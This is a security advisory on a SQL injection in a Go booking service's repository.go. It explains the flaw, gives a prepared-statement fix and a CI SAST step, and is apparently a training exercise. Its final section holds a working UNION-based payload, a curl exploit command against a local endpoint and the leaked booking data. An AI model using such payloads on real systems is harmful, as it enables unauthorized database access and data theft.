# SQL Injection in [repository.go](../postgres/repository.go)

***
<font color="#df3d03">Severity : 8.8 High</font>  
Date : 04/04/2023  
Reporter : Nicolas Viaud   
Weakness enumeration : [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)  
CVSS v3.1 Vector : `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
***

If authenticated, an attacker can inject malicious code in the HTTP request in order to execute sql command directly in the postgresql database. This vulnerability is considered high because it can lead to:  
* information disclosure and alteration by bypassing authorization at the service layer
* denial of service by deleting the content of the database
* remote code execution

The 3 functions code `Insert(ctx context.Context, b innsecure.Booking) error`, `List(ctx context.Context, hotelID int) ([]innsecure.Booking, error)`, `ByID(ctx context.Context, hotelID int, ID string) (*innsecure.Booking, error)` of the [repository.go](../postgres/repository.go) file are vulnerable.  
 
### Explanation
Here an extract of the function `List(ctx context.Context, hotelID int) ([]innsecure.Booking, error)`:
```go
stmt := fmt.Sprintf(`select "id", "hotelid", "arrive", "leave", "name" from "Bookings" WHERE hotelid='%d'`, hotelID)
rows, err := r.db.Query(stmt)
```
Because the SQL query is generated by a simple string format, parameters are not sanitize correctly. Special SQL characters like `'`,`--` will be interpreted as part of the query and can lead to some unexpect behavior. For example, if the parameter `hotelID` is set to `' or '1' = '1`, the real query execute to the database would be `select "id", "hotelid", "arrive", "leave", "name" from "Bookings" WHERE hotelid='' or '1' = '1'` and would bypass the hotel id criteria.

### Development Fix

#### Task 1
To protect against SQL injection, ALL the queries to the database should use prepared statements like describe in the [official documentation](https://go.dev/doc/database/sql-injection).  
As an example, the non vulnerable version of the function `List(ctx context.Context, hotelID int) ([]innsecure.Booking, error)` would be:
```go
stmt := `select "id", "hotelid", "arrive", "leave", "name" from "Bookings" WHERE hotelid=$1`
rows, err := r.db.Query(stmt, hotelID)
```

#### Task2
Add a step in the CI that block the merge of the branch if a SAST tool (like SonarQube) detect some code vulnerable to SQL injection.


### Example of exploit (for curious people only)
The REST endpoint `/hotels/$hotelId/bookings/$bookingId` can be abused because bookingId can be modified by the users and is used in the query.

The goal of this exploit is to retrieve all the booking id, hotel id and booking name of the database.
To achieve this goal, an example of payload to put in the url could be `00000000-0000-0000-0000-000000000000' union select '00000000-0000-0000-0000-000000000000', 0, array_to_string(array_agg("id"),' | '), array_to_string(array_agg("hotelid"),' | '), array_to_string(array_agg("name"),' | ') from "Bookings" where '1'='1`.  
The resulting query would be `select "id", "hotelid", "arrive", "leave", "name" from "Bookings" where "hotelid"='123' and "id"='00000000-0000-0000-0000-000000000000' union select '00000000-0000-0000-0000-000000000000', 0, array_to_string(array_agg("id"),' | '), array_to_string(array_agg("hotelid"),' | '), array_to_string(array_agg("name"),' | ') from "Bookings" where '1'='1'`.  

You can find below the curl command to exploit this vulnerability:
```shell
VALID_TOKEN=#paste valid JWT token
curl 'http://localhost:8080/hotels/789/bookings/00000000-0000-0000-0000-000000000000%27%20union%20select%20%2700000000-0000-0000-0000-000000000000%27%2C%200%2C%20array_to_string(array_agg(%22id%22)%2C%27%20%7C%20%27)%2C%20array_to_string(array_agg(%22hotelid%22)%2C%27%20%7C%20%27)%2C%20array_to_string(array_agg(%22name%22)%2C%27%20%7C%20%27)%20from%20%22Bookings%22%20where%20%271%27%3D%271' --header 'Authorization: Bearer ${VALID_TOKEN}' | jq .
```
The result of the command is printed below :
```json
{
  "type": "",
  "id": "00000000-0000-0000-0000-000000000000",
  "version": 0,
  "hotel_id": 0,
  "arrive": "968bc972-e88e-4b7c-8730-fce0ca931b6a | 79c5f7d7-a301-434c-8f96-52ae476cf3e3",
  "leave": "123 | 456",
  "name": "booking1 | booking2"
}
```
All booking id are in the json field `arrive`.  
All hotel id are in the json field `leave`.  
All booking name id are in the json field `name`.  